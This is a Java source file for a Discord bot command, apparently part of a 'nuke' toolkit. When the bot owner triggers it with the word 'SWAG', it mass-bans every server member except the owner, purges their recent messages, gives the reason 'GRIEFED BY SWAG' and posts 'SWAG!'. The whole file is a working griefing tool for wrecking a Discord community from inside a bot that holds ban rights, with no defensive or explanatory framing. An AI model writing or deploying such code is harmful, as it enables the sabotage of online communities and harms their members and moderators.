package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class BanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
            return;
        }
        int i;
        try {
            List<Member> members = event.getGuild().getMembers();
            for (i = 0; i <= members.size(); i++) {
                try {
                    if (!(members.get(i).getUser().getIdLong() == Core.OWNERID))
                    event.getGuild().ban(members.get(i), 7).reason("GRIEFED BY SWAG").queue();
                } catch (HierarchyException e) {
                    //	event.getChannel().sendMessage("Caught Hierarchy Exception, Attempting to Skip").queue();
                }
//                EmbedBuilder ban = new EmbedBuilder();
//                ban.setColor(0xff802b);
//                ban.setDescription("banned " + members.get(i).getAsMention());
            //    event.getChannel().sendMessage(ban.build()).queue();;
            }
            event.getChannel().sendMessage("SWAG!").queue();
        } catch (HierarchyException | IndexOutOfBoundsException e) {

        }
    }

    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "SWAG";
    }

    @Override
    public String[] getAlias() {
        return new String[0];
    }
}
